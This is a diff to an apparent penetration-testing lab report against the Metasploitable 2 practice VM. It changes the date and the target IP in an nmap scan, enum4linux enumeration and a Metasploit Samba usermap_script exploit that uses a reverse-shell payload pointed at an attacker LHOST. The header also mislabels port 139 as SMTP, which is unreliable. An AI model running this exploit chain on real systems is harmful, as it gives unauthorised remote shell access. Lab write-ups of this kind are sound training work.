@@ -3,14 +3,14 @@ Penetration Testing Report – Metasploitable2 (Port 139 - SMB)
 Target: Metasploitable 2
 IP Address: 192.168.1.101
 Port: 139 (SMTP)
-Date: 15-06-2025
+Date: 09-06-2025
 Tested By: [ ME ]
 
 3. Reconnaissance
 
 3.1 Nmap Scan
 Command:
-nmap -sS -p 139 -sV -O 192.168.56.101
+nmap -sS -p 139 -sV -O 192.168.1.101
 
 Results:
 PORT    STATE SERVICE  VERSION
@@ -20,7 +20,7 @@ PORT    STATE SERVICE  VERSION
 
 4.1 Enum4linux
 Command:
-enum4linux -a 192.168.56.101
+enum4linux -a 192.168.1.101
 
 Key Findings:
 - Samba version: 3.0.20
@@ -41,10 +41,10 @@ Steps:
    use exploit/multi/samba/usermap_script
 
 3. Configure the exploit:
-   set RHOST 192.168.56.101
+   set RHOST 192.168.1.101
    set RPORT 139
    set PAYLOAD cmd/unix/reverse
-   set LHOST 192.168.56.1  # Attacker's IP
+   set LHOST 192.168.1.1  # Attacker's IP
    run
 
 Result:
